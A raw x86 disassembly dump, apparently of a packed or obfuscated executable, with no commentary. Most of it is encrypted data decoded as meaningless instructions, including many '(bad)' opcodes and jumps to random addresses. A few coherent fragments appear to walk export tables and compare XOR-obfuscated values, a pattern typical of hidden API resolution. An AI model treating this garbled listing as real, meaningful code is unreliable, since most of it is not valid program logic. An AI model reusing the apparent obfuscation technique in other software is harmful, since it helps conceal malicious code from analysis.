  40cb2a:	stos   DWORD PTR es:[edi],eax
  40cb2b:	outs   dx,BYTE PTR ds:[esi]
  40cb2c:	mov    al,ds:0x62493668
  40cb31:	cli    
  40cb32:	cdq    
  40cb33:	adc    DWORD PTR [esi-0x20],edi
  40cb36:	stc    
  40cb37:	aaa    
  40cb38:	mov    al,0xae
  40cb3a:	xchg   edi,eax
  40cb3b:	mov    ds:0x69f6e9b8,eax
  40cb40:	pop    edx
  40cb41:	fdecstp 
  40cb43:	mov    edi,0x368c5091
  40cb48:	loop   0x40cb82
  40cb4a:	mov    ds:0x571cc21f,al
  40cb4f:	xchg   ebx,eax
  40cb50:	(bad)  
  40cb51:	loope  0x40cb13
  40cb53:	dec    esp
  40cb54:	jo     0x40cb31
  40cb56:	mov    ah,0xfc
  40cb58:	retf   
  40cb59:	jnp    0xbebe9bec
  40cb5f:	fcom   DWORD PTR [edx+0x41]
  40cb62:	dec    ebp
  40cb63:	in     al,0x55
  40cb65:	arpl   WORD PTR [eax+0x4f],cx
  40cb68:	add    eax,0x7a658133
  40cb6d:	dec    eax
  40cb6e:	pop    esi
  40cb6f:	mov    ah,0xcb
  40cb71:	out    0xc8,al
  40cb73:	push   ss
  40cb74:	pop    ebx
  40cb75:	cmp    DWORD PTR [eax+0x27],ebp
  40cb78:	push   ds
  40cb79:	adc    BYTE PTR [ecx-0x69],0xa5
  40cb7d:	retf   
  40cb7e:	mov    BYTE PTR [edx+0x55],dl
  40cb81:	jl     0x40cbed
  40cb83:	or     DWORD PTR [ebx-0x13516d42],ebp
  40cb89:	push   ecx
  40cb8a:	pop    ecx
  40cb8b:	ins    BYTE PTR es:[edi],dx
  40cb8c:	sbb    BYTE PTR [edi+0x16],dl
  40cb8f:	mov    bh,0x50
  40cb91:	popa   
  40cb92:	xchg   esi,eax
  40cb93:	mov    db5,ebx
  40cb96:	xchg   edi,eax
  40cb97:	cmp    al,0x22
  40cb99:	jp     0x40cb4a
  40cb9b:	mov    BYTE PTR [eax+eiz*2+0x65060df4],cl
  40cba2:	stos   DWORD PTR es:[edi],eax
  40cba3:	(bad)  
  40cba4:	pop    edx
  40cba5:	rcl    BYTE PTR [edx+0x7],0x7b
  40cba9:	dec    esp
  40cbaa:	outs   dx,BYTE PTR ds:[esi]
  40cbab:	mov    ?,edx
  40cbad:	pop    edx
  40cbae:	mov    eax,DWORD PTR [eax]
  40cbb0:	std    
  40cbb1:	adc    eax,0xec53b08b
  40cbb6:	ret    0xe532
  40cbb9:	je     0x40cbf5
  40cbbb:	pop    esp
  40cbbc:	shr    DWORD PTR [ebp+ecx*1+0x2c],cl
  40cbc0:	sub    eax,0xd075ff50
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x224b7f43
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	fwait
  40cc4f:	adc    bh,ch
  40cc51:	repnz sti 
  40cc53:	stos   DWORD PTR es:[edi],eax
  40cc54:	cmp    al,0x13
  40cc56:	in     eax,dx
  40cc57:	outs   dx,BYTE PTR ds:[esi]
  40cc58:	int    0xcc
  40cc5a:	push   0xffffff9c
  40cc5c:	and    al,0xd9
  40cc5e:	sub    DWORD PTR [edi],0xfffffffe
  40cc61:	pushf  
  40cc62:	pop    esi
  40cc63:	pusha  
  40cc64:	jl     0x40cc22
  40cc66:	iret   
  40cc67:	jnp    0x40ccdd
  40cc69:	(bad)  
  40cc6a:	out    0xcc,al
  40cc6c:	loop   0x40ccdd
  40cc6e:	push   edi
  40cc6f:	add    al,0xb6
  40cc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc72:	data16 test BYTE PTR [edx+0x11],cl
  40cc76:	pushf  
  40cc77:	dec    eax
  40cc78:	aad    0x58
  40cc7a:	(bad)  
  40cc7b:	fxch   st(1)
  40cc7d:	shr    DWORD PTR [edi],cl
  40cc7f:	sub    eax,0x1c7543fb
  40cc84:	xchg   edi,eax
  40cc85:	sub    eax,0xe7a244a3
  40cc8a:	loopne 0x40cc72
  40cc8c:	xor    edi,DWORD PTR [ecx-0x4340be02]
  40cc92:	js     0x40cc4a
  40cc94:	inc    eax
  40cc95:	ins    DWORD PTR es:[edi],dx
  40cc96:	inc    eax
  40cc97:	das    
  40cc98:	xor    eax,0x7e39b157
  40cc9d:	test   eax,0x7033be4c
  40cca3:	push   0x423c65f6
  40cca8:	fwait
  40cca9:	es push eax
  40ccab:	cmp    al,0xfe
  40ccad:	(bad)  
  40ccae:	mov    bh,0x7e
  40ccb0:	repz shr DWORD PTR [edi],1
  40ccb3:	je     0x40cd13
  40ccb5:	pop    ss
  40ccb6:	ja     0x40cd12
  40ccb8:	fisub  WORD PTR [ebp-0x64638e1]
  40ccbe:	dec    eax
  40ccbf:	rcl    DWORD PTR [eax+0x41],cl
  40ccc2:	xchg   edi,eax
  40ccc3:	(bad)  
  40ccc4:	ins    BYTE PTR es:[edi],dx
  40ccc5:	xor    al,0x4
  40ccc7:	mov    edi,0x84f577ac
  40cccc:	fnstsw WORD PTR ds:0x9eb50b18
  40ccd2:	mov    edi,0xc5710def
  40ccd7:	gs jmp 0x40cd1f
  40ccda:	xor    bl,BYTE PTR gs:[ebx]
  40ccdd:	paddq  mm4,mm3
  40cce0:	lods   al,BYTE PTR ds:[esi]
  40cce1:	ja     0x40cccd
  40cce3:	int    0xe7
  40cce5:	cdq    
  40cce6:	adc    BYTE PTR [ebx+0x423c19ab],0x69
  40cced:	aaa    
  40ccee:	cwde   
  40ccef:	jg     0x40cc85
  40ccf1:	xchg   edx,eax
  40ccf2:	jle    0x40ccb8
  40ccf4:	cli    
  40ccf5:	inc    ebx
  40ccf6:	int    0xb5
  40ccf8:	(bad)  
  40ccf9:	ror    al,1
  40ccfb:	add    BYTE PTR [esp+ebx*8],bl
  40ccfe:	icebp  
  40ccff:	push   ss
  40cd00:	and    al,0xac
  40cd02:	cmc    
  40cd03:	retf   
  40cd04:	pop    ebp
  40cd05:	out    dx,eax
  40cd06:	pop    edi
  40cd07:	push   eax
  40cd08:	lds    ecx,FWORD PTR [ebx-0x4c]
  40cd0b:	sbb    BYTE PTR [edi],dl
  40cd0d:	stos   DWORD PTR es:[edi],eax
  40cd0e:	ja     0x40cd59
  40cd10:	dec    edx
  40cd11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd12:	jnp    0x40ccfd
  40cd14:	ror    BYTE PTR [ebp+0x39],1
  40cd17:	dec    ebp
  40cd18:	mov    cl,0x99
  40cd1a:	mov    ah,0x75
  40cd1c:	or     DWORD PTR [esi+0x7ea04b0e],0x39
  40cd23:	push   ss
  40cd24:	mov    cl,0x57
  40cd26:	cdq    
  40cd27:	mov    eax,0x691ecda1
  40cd2c:	jbe    0x40cd46
  40cd2e:	in     eax,0xff
  40cd30:	or     ah,BYTE PTR [ecx+0x792bb529]
  40cd36:	cld    
  40cd37:	ds ds or eax,0x9c17eaf7
  40cd3e:	js     0x40cd2b
  40cd40:	dec    esi
  40cd41:	rcl    ch,cl
  40cd43:	ror    DWORD PTR [ebx-0x1f],1
  40cd46:	jmp    0x26f0:0x7afc8026
  40cd4d:	sti    
  40cd4e:	dec    ebx
  40cd4f:	cdq    
  40cd50:	dec    edi
  40cd51:	cmp    DWORD PTR [ecx],0x37
  40cd54:	iret   
  40cd55:	stc    
  40cd56:	pop    esp
  40cd57:	scas   eax,DWORD PTR es:[edi]
  40cd58:	sub    ecx,ebx
  40cd5a:	stos   BYTE PTR es:[edi],al
  40cd5b:	jle    0x40cdd6
  40cd5d:	mov    bh,0xc8
  40cd5f:	imul   DWORD PTR gs:[edx]
  40cd62:	jno    0x40cda3
  40cd64:	mov    BYTE PTR [edi+edi*2],al
  40cd67:	ss xchg edi,eax
  40cd69:	fdiv   st(6),st
  40cd6b:	mov    al,ds:0xbc0bdf85
  40cd70:	adc    al,0xf0
  40cd72:	test   ecx,eax
  40cd74:	lods   eax,DWORD PTR ds:[esi]
  40cd75:	adc    cl,cl
  40cd77:	inc    ebp
  40cd78:	ins    BYTE PTR es:[edi],dx
  40cd79:	nop
  40cd7a:	sub    al,0xd4
  40cd7c:	out    0x1f,eax
  40cd7e:	lock fisub WORD PTR [ebp-0x29]
  40cd82:	add    al,0x38
  40cd84:	in     eax,0x3c
  40cd86:	or     al,0x24
  40cd88:	inc    edx
  40cd89:	rol    DWORD PTR [ecx-0x1c7a6195],1
  40cd8f:	add    al,0x21
  40cd91:	sbb    ebx,DWORD PTR [ebp-0xb769764]
  40cd97:	xor    cl,dh
  40cd99:	mov    bl,0x8
  40cd9b:	and    BYTE PTR [ecx+0x2f4237c3],bl
  40cda1:	das    
  40cda2:	jo     0x40cd5c
  40cda4:	jmp    0xa8c0:0x34b9985a
  40cdab:	adc    DWORD PTR [edx+0x60869534],ebp
  40cdb1:	ret    
  40cdb2:	icebp  
  40cdb3:	std    
  40cdb4:	shl    cl,1
  40cdb6:	out    dx,al
  40cdb7:	add    ecx,DWORD PTR [edx+edx*1-0x1ca92f69]
  40cdbe:	nop
  40cdbf:	cmp    DWORD PTR [ebp+0x10],eax
  40cdc2:	cld    
  40cdc3:	add    ebp,edx
  40cdc5:	aam    0x83
  40cdc7:	mov    ecx,0x303b86d7
  40cdcc:	imul   esi,DWORD PTR [ebx-0x30],0xffffff9d
  40cdd0:	shrd   DWORD PTR [ecx-0x47],ebx,0x2
  40cdd5:	dec    edi
  40cdd6:	mov    esp,0xc08d560c
  40cddb:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40cddd:	out    0xfa,eax
  40cddf:	mov    ebp,?
  40cde1:	xchg   edx,eax
  40cde2:	in     al,0xb8
  40cde4:	mov    fs,WORD PTR [edi-0x7d35d976]
  40cdea:	call   0xdd3b:0x3648c8bd
  40cdf1:	xchg   esi,eax
  40cdf2:	inc    esi
  40cdf3:	(bad)  
  40cdf4:	ret    0xbeae
  40cdf7:	xor    al,0xe
  40cdf9:	repz and BYTE PTR [ebp+0x381cacb2],dh
  40ce00:	mov    ch,0x1b
  40ce02:	mov    al,0xb8
  40ce04:	cmp    eax,0x5cdfec6a
  40ce09:	add    al,0x8f
  40ce0b:	(bad)  
  40ce0c:	leave  
  40ce0d:	mov    ds:0x5fa94d01,al
  40ce12:	fwait
  40ce13:	std    
  40ce14:	inc    ecx
  40ce15:	pop    eax
  40ce16:	daa    
  40ce17:	test   esp,esp
  40ce19:	sub    eax,0xb7636ec8
  40ce1e:	addr16 jnp 0x40ce7d
  40ce21:	jmp    0x7b7504d8
  40ce26:	gs js  0x40cdf5
  40ce29:	push   ebp
  40ce2a:	sub    DWORD PTR [ebp+0x76],edx
  40ce2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce2e:	mov    bl,BYTE PTR [eax]
  40ce30:	push   cs
  40ce31:	xlat   BYTE PTR ds:[ebx]
  40ce32:	fwait
  40ce33:	push   es
  40ce34:	je     0x40cdc6
  40ce36:	je     0x40ce05
  40ce38:	xchg   ecx,edx
  40ce3a:	in     eax,0x3e
  40ce3c:	call   0x97ec:0x35417855
  40ce43:	dec    ebx
  40ce44:	push   0xfffffffd
  40ce46:	(bad)  
  40ce47:	mov    ds:0x189a540c,al
  40ce4c:	cdq    
  40ce4d:	lahf   
  40ce4e:	fsub   QWORD PTR [eax-0x5a2d1fe3]
  40ce54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce55:	adc    edx,edx
  40ce57:	dec    edx
  40ce58:	repnz and BYTE PTR [eax+ecx*8+0x6a63eaf4],cl
  40ce60:	jg     0x40ce06
  40ce62:	call   0x152aec0e
  40ce67:	jmp    0xebd8:0x197f22ca
  40ce6e:	push   edi
  40ce6f:	pop    edi
  40ce70:	push   ebp
  40ce71:	stc    
  40ce72:	std    
  40ce73:	sub    BYTE PTR [edi-0x69cfbd8e],bl
  40ce79:	xchg   ebp,eax
  40ce7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce7b:	jmp    0x2e9dbf32
  40ce80:	inc    ecx
  40ce81:	pop    ds
  40ce82:	enter  0xc02a,0x3e
  40ce86:	add    cl,cl
  40ce88:	into   
  40ce89:	lods   eax,DWORD PTR ds:[esi]
  40ce8a:	nop
  40ce8b:	and    al,0x20
  40ce8d:	mov    edx,0xc14c2da
  40ce92:	rcr    esp,0x8e
  40ce95:	cmc    
  40ce96:	mov    eax,0x83e63cd1
  40ce9b:	push   0x76
  40ce9d:	pusha  
  40ce9e:	cmp    DWORD PTR [ebx-0x6f5577c1],0x38
  40cea5:	jge    0x40cf08
  40cea7:	out    dx,eax
  40cea8:	or     DWORD PTR [esi+0x1262eb6f],eax
  40ceae:	bound  edx,QWORD PTR [esi]
  40ceb0:	mov    ah,0xee
  40ceb2:	mov    WORD PTR [edx],ss
  40ceb4:	outs   dx,BYTE PTR ds:[esi]
  40ceb5:	add    edi,DWORD PTR [edx+0x623374c6]
  40cebb:	inc    ebp
  40cebc:	stos   DWORD PTR es:[edi],eax
  40cebd:	sbb    bl,ch
  40cebf:	sub    ch,ch
  40cec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec2:	inc    edx
  40cec3:	add    eax,0x3b7cce04
  40cec8:	popf   
  40cec9:	push   ecx
  40ceca:	sub    dl,bl
  40cecc:	mov    ebx,0xd92641ec
  40ced1:	lea    eax,[edx+0x40]
  40ced4:	das    
  40ced5:	call   0xfabd0ea
  40ceda:	or     DWORD PTR ds:0xdad1cd2,esi
  40cee0:	cmp    DWORD PTR ds:0xe530a557,esp
  40cee6:	mov    ebx,0x6ee94963
  40ceec:	mov    DWORD PTR [ecx-0x7b09b7b6],esp
  40cef2:	ret    0x269
  40cef5:	or     BYTE PTR [esi],cl
  40cef7:	(bad)  [esp+ebx*8+0x7f]
  40cefb:	aas    
  40cefc:	adc    cl,BYTE PTR [ebx]
  40cefe:	add    BYTE PTR ds:[eax],0x74
  40cf02:	outs   dx,DWORD PTR ds:[esi]
  40cf03:	jmp    0x9cb3d065
  40cf08:	push   edx
  40cf09:	jmp    0xc2422438
  40cf0e:	loopne 0x40cf32
  40cf10:	jo     0x40cf88
  40cf12:	je     0x40cec6
  40cf14:	out    dx,ax
  40cf16:	adc    dh,BYTE PTR [esi]
  40cf18:	push   0xffffffbe
  40cf1a:	inc    ebp
  40cf1b:	xchg   edx,eax
  40cf1c:	push   es
  40cf1d:	xadd   BYTE PTR [eax-0x3a585f7a],cl
  40cf24:	adc    ah,BYTE PTR [ebp-0x4d]
  40cf27:	pop    ss
  40cf28:	les    ecx,FWORD PTR [ebx-0x2a]
  40cf2b:	pusha  
  40cf2c:	mov    bh,0x47
  40cf2e:	pop    ecx
  40cf2f:	enter  0xe183,0xcf
  40cf33:	into   
  40cf34:	dec    edx
  40cf35:	sbb    DWORD PTR [ecx+edx*8-0x3973ca3],esp
  40cf3c:	pop    es
  40cf3d:	mov    ecx,DWORD PTR [edi+0x4c7db76c]
  40cf43:	leave  
  40cf44:	sti    
  40cf45:	hlt    
  40cf46:	jne    0x40cf70
  40cf48:	test   BYTE PTR [edi+0x36],0x67
  40cf4c:	hlt    
  40cf4d:	xchg   ebx,eax
  40cf4e:	je     0x40cf33
  40cf50:	dec    ebx
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x95
  40cf80:	push   eax
  40cf81:	or     esp,DWORD PTR ds:0x7e7e9621
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	(bad)
  40cf8f:	xchg   ebx,eax
  40cf90:	cmc    
  40cf91:	xor    DWORD PTR [eax-0x41ae8958],ecx
  40cf97:	je     0x40cf7e
  40cf99:	cmc    
  40cf9a:	test   DWORD PTR [bx+0x50d2],ebp
  40cf9f:	sbb    eax,ebx
  40cfa1:	call   0x1188:0x535fefe1
  40cfa8:	mov    al,ds:0x999ba70d
  40cfad:	cmp    al,BYTE PTR [ebx-0x64347d2c]
  40cfb3:	rol    DWORD PTR [ebp+0x1b],1
  40cfb6:	inc    edi
  40cfb7:	popa   
  40cfb8:	dec    ebp
  40cfb9:	dec    edx
  40cfba:	ds pop ss
  40cfbc:	and    esp,DWORD PTR ds:0xef4b32ea
  40cfc2:	inc    esi
  40cfc3:	pop    ecx
  40cfc4:	je     0x40cf55
  40cfc6:	scas   al,BYTE PTR es:[edi]
  40cfc7:	push   0x226fbf87
  40cfcc:	fisttp QWORD PTR [ebx-0x72]
  40cfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd0:	jbe    0x40cf57
  40cfd2:	jle    0x40cfb9
  40cfd4:	leave  
  40cfd5:	cmp    dh,al
  40cfd7:	test   al,0x7f
  40cfd9:	nop
  40cfda:	sbb    eax,0xdbb2e560
  40cfdf:	cmp    edi,DWORD PTR [ebp+0x652ecd8]
  40cfe5:	pop    ecx
  40cfe6:	sub    ebx,DWORD PTR [ebp-0x46]
  40cfe9:	ja     0x40cfd7
  40cfeb:	adc    DWORD PTR [esi+0x3c977baf],0xf06a1a0a
  40cff5:	daa    
  40cff6:	in     eax,dx
  40cff7:	leave  
  40cff8:	jg     0x40d064
  40cffa:	mov    eax,ds:0xa8862429
  40cfff:	dec    ebp
  40d000:	shr    BYTE PTR [esi-0xe33c941],cl
  40d006:	adc    al,0x90
  40d008:	dec    ebx
  40d009:	mov    ds:0xfac0492c,al
  40d00e:	inc    ebp
  40d00f:	clc    
  40d010:	dec    ecx
  40d011:	push   edi
  40d012:	enter  0xcf13,0xbb
  40d016:	dec    esp
  40d017:	test   al,0x51
  40d019:	fwait
  40d01a:	xchg   edi,eax
  40d01b:	cwde   
  40d01c:	jecxz  0x40cfa3
  40d01e:	xchg   edi,eax
  40d01f:	jo     0x40d072
  40d021:	shr    DWORD PTR ds:0xab6a0d35,0x7c
  40d028:	mov    bl,0x6a
  40d02a:	jbe    0x40d03b
  40d02c:	cmp    BYTE PTR [esi-0x2a],bh
  40d02f:	mov    edi,0x8bbf4636
  40d034:	fucomi st,st(1)
  40d036:	loopne 0x40cff5
  40d038:	or     eax,0x5d584899
  40d03d:	push   ds
  40d03e:	sbb    bl,al
  40d040:	or     ebp,DWORD PTR [esi+0x28801f97]
  40d046:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40d048:	out    0x30,al
  40d04a:	test   BYTE PTR [edi-0x6b88fa0a],bh
  40d050:	aam    0xf4
  40d052:	jno    0x40d082
  40d054:	retf   0xaf6a
  40d057:	retf   0x7a31
  40d05a:	push   ds
  40d05b:	in     eax,0xb0
  40d05d:	push   ebp
  40d05e:	cmc    
  40d05f:	(bad)  
  40d060:	jb     0x40d09c
  40d062:	shl    cl,cl
  40d064:	add    ebx,esp
  40d066:	dec    ebx
  40d067:	repnz mov edx,0xe3361a4c
  40d06d:	loopne 0x40d04c
  40d06f:	lea    edx,[eax+edi*2+0x6911d44c]
  40d076:	aas    
  40d077:	or     al,0xeb
  40d079:	mov    dh,0x6d
  40d07b:	xlat   BYTE PTR ds:[ebx]
  40d07c:	mov    esi,0xc194bfed
  40d081:	call   0xe97a21a5
  40d086:	push   edi
  40d087:	dec    esp
  40d088:	mov    ch,0xd4
  40d08a:	mov    al,0x98
  40d08c:	int    0xff
  40d08e:	jge    0x40d03c
  40d090:	std    
  40d091:	sti    
  40d092:	mov    ch,0x47
  40d094:	mov    dl,0x4b
  40d096:	xchg   ebx,eax
  40d097:	pop    es
  40d098:	lea    ebx,[ebx+eax*4]
  40d09b:	xor    DWORD PTR [esp+eiz*4],ebp
  40d09e:	test   eax,0x2a054008
  40d0a3:	push   cs
  40d0a4:	mov    DWORD PTR ds:0x87c05f4f,edi
  40d0aa:	cmp    DWORD PTR [esi+ecx*4],0x160e0e9
  40d0b1:	fs cmp eax,0x23775c8e
  40d0b7:	xor    BYTE PTR [ebp+0xa],dl
  40d0ba:	ret    
  40d0bb:	je     0x40d134
  40d0bd:	scas   eax,DWORD PTR es:[edi]
  40d0be:	xlat   BYTE PTR ds:[ebx]
  40d0bf:	pusha  
  40d0c0:	fcomp  QWORD PTR [ecx-0x5f]
  40d0c3:	test   eax,0x3e2fa394
  40d0c8:	xor    eax,0x209c3f08
  40d0cd:	ret    0xdf89
  40d0d0:	add    BYTE PTR [ebp-0x7],al
  40d0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0d4:	and    BYTE PTR [ecx+0x195215b],ch
  40d0da:	fs retf 0xf34d
  40d0de:	xchg   BYTE PTR [edx+0x50da9c1f],ah
  40d0e4:	mov    ds:0xd1e9730b,al
  40d0e9:	sbb    ah,BYTE PTR [eax+0x4d]
  40d0ec:	jg     0x40d131
  40d0ee:	adc    eax,0xf7604eb7
  40d0f3:	or     esi,DWORD PTR [eax]
  40d0f5:	imul   ecx,eax,0x80cf35ff
  40d0fb:	mov    ch,0x23
  40d0fd:	jne    0x40d128
  40d0ff:	or     al,0xa
  40d101:	jne    0x40d140
  40d103:	call   0xca5:0xa83cf61b
  40d10a:	out    0x71,al
  40d10c:	lds    ebp,FWORD PTR [ecx+0xa]
  40d10f:	mov    ds:0x9f82dc53,al
  40d114:	imul   edi,DWORD PTR [edi+0x38],0xffffff93
  40d118:	lds    ebp,FWORD PTR [edi-0xd]
  40d11b:	push   ss
  40d11c:	int3   
  40d11d:	sbb    al,0x46
  40d11f:	jl     0x40d101
  40d121:	push   edx
  40d122:	sub    al,0xfb
  40d124:	jne    0x40d159
  40d126:	loopne 0x40d15a
  40d128:	push   0xe87697e8
  40d12d:	loop   0x40d185
  40d12f:	jmp    0x6a6800e5
  40d134:	pop    ecx
  40d135:	pop    esi
  40d136:	mov    ch,0xe8
  40d138:	mov    bh,0xd5
  40d13a:	loop   0x40d0e2
  40d13c:	pusha  
  40d13d:	pop    ss
  40d13e:	mov    WORD PTR [edx],ds
  40d140:	(bad)  
  40d143:	repnz (bad) 
  40d145:	popf   
  40d146:	cld    
  40d147:	pushf  
  40d148:	loopne 0x40d14d
  40d14a:	pop    esi
  40d14b:	jecxz  0x40d156
  40d14d:	push   esp
  40d14e:	jecxz  0x40d17d
  40d150:	mov    ecx,0xb66081c9
  40d155:	xor    DWORD PTR [ecx-0x3ff5b1b1],ecx
  40d15b:	add    BYTE PTR [esi],bl
  40d15d:	mov    BYTE PTR [ebx+0x10],al
  40d160:	mov    ecx,0xd3313d34
  40d165:	sahf   
  40d166:	mov    eax,ds:0xdbddd1a8
  40d16b:	clc    
  40d16c:	mov    ds:0x33ffdd89,al
  40d171:	inc    eax
  40d172:	cmp    al,0xa2
  40d174:	pop    ss
  40d175:	sbb    eax,0xc5cde723
  40d17a:	fnsave [ebp-0x7f1deeb]
  40d180:	jle    0x40d106
  40d182:	adc    DWORD PTR [edx],edi
  40d184:	cmp    BYTE PTR [ebx+0x4e],dh
  40d187:	mov    eax,0x82bb5bf5
  40d18c:	dec    ebx
  40d18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d18e:	and    dh,BYTE PTR [ecx-0x65]
  40d191:	mov    esi,0xdfee57ec
  40d196:	inc    eax
  40d197:	cmc    
  40d198:	cmp    eax,0xbfa7e718
  40d19d:	push   edx
  40d19e:	mov    ebp,eax
  40d1a0:	jae    0x40d18b
  40d1a2:	and    esi,DWORD PTR [edi]
  40d1a4:	loope  0x40d1db
  40d1a6:	mov    ah,0xda
  40d1a8:	and    ch,BYTE PTR [ebp-0x5f]
  40d1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ac:	addr16 inc ebp
  40d1ae:	ret    0x7c1a
  40d1b1:	xchg   ecx,eax
  40d1b2:	or     BYTE PTR ds:0xaf9ed31,ah
  40d1b8:	push   ds
  40d1b9:	repnz nop
  40d1bb:	out    0x1c,al
  40d1bd:	idiv   ah
  40d1bf:	xchg   esp,eax
  40d1c0:	out    0x50,eax
  40d1c2:	cmp    eax,0xa65e87cd
  40d1c7:	das    
  40d1c8:	test   ah,0x30
  40d1cb:	ret    0x23b1
  40d1ce:	xor    DWORD PTR [ebp+edi*8-0x2b],eax
  40d1d2:	xchg   al,bl
  40d1d4:	fcmovne st,st(1)
  40d1d6:	push   ds
  40d1d7:	dec    ecx
  40d1d8:	stos   DWORD PTR es:[edi],eax
  40d1d9:	mov    ah,0xa5
  40d1db:	mov    al,0x9c
  40d1dd:	jmp    0xd6f6ba50
  40d1e2:	or     BYTE PTR [esi-0x51],ah
  40d1e5:	cs xor dh,al
  40d1e8:	fcmovne st,st(4)
  40d1ea:	out    dx,al
  40d1eb:	pop    edx
  40d1ec:	mov    ebp,0xebe8ef7f
  40d1f1:	pop    esp
  40d1f2:	and    DWORD PTR [ebp-0x3e27f0ee],eax
  40d1f8:	mov    ?,WORD PTR es:[edx+0x30d70ba8]
  40d1ff:	inc    eax
  40d200:	jecxz  0x40d1bd
  40d202:	pusha  
  40d203:	enter  0x5211,0x12
  40d207:	mov    al,0x39
  40d209:	das    
  40d20a:	xor    edi,DWORD PTR [ecx+0x45eeba20]
  40d210:	mov    esp,0xbaddd6b8
  40d215:	jp     0x40d296
  40d217:	scas   eax,DWORD PTR es:[edi]
  40d218:	add    cl,BYTE PTR [ecx-0x68c879d]
  40d21e:	inc    esp
  40d21f:	or     DWORD PTR [ebp+0x67b27f39],ebp
  40d225:	dec    ebp
  40d226:	enter  0xd21b,0xc9
  40d22a:	inc    esi
  40d22b:	(bad)  
  40d22c:	cli    
  40d22d:	ss test al,0x30
  40d230:	add    eax,0x80053c8f
  40d235:	fstp   TBYTE PTR [edi-0xa857d78]
  40d23b:	sub    al,0x2
  40d23d:	fld    QWORD PTR [ebp+eiz*2-0x1a]
  40d241:	cwde   
  40d242:	mov    al,0x8
  40d244:	popa   
  40d245:	and    al,0x9a
  40d247:	push   ebp
  40d248:	cmp    ch,BYTE PTR [eax]
  40d24a:	outs   dx,DWORD PTR ds:[esi]
  40d24b:	out    dx,al
  40d24c:	rcr    esi,1
  40d24e:	fidivr WORD PTR [eax-0x4bb4bf6a]
  40d254:	scas   eax,DWORD PTR es:[edi]
  40d255:	popa   
  40d256:	mov    dl,BYTE PTR [eax-0x538595a5]
  40d25c:	ins    BYTE PTR es:[edi],dx
  40d25d:	imul   esi,DWORD PTR [eax],0x9796a13
  40d263:	mov    ah,0x38
  40d265:	xor    BYTE PTR [eax+eiz*4+0x6185f29f],al
  40d26c:	mov    ah,0xe9
  40d26e:	pop    ebp
  40d26f:	dec    edx
  40d270:	pop    ebx
  40d271:	add    al,0xa5
  40d273:	lock push ds
  40d275:	enter  0x255,0xbd
  40d279:	inc    ecx
  40d27a:	dec    ebx
  40d27b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d27c:	xchg   DWORD PTR [ebx+0x1841301],ecx
  40d282:	test   BYTE PTR [ecx+0x3c0695c4],al
  40d288:	retf   0xc0
  40d28b:	fcom   QWORD PTR [ecx-0x3478a482]
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
